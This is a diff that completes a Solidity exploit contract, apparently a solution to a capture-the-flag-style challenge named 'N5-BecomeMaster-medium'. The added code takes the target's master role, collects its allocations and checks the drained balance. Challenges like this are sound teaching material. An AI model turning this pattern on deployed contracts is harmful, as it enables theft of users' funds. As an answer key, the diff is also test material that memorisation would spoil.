@@ -4,11 +4,16 @@ pragma solidity 0.8.11;
 import "../N5-BecomeMaster-medium.sol";
 
 contract N5ExploitHack {
-    constructor(N5BecomeMaster instance) payable {
-    // Complete with your own code
+    N5BecomeMaster instance;
+    constructor(N5BecomeMaster _instance) payable {
+        instance = _instance;
     }
 
     function finalize() external {
-        // can be used to finalize the exploit patten
+        instance.takeMasterRole();
+        instance.collectAllocations();
+        assert(address(this).balance == 0.0001 ether);
     }
+
+    receive() external payable {}
 }
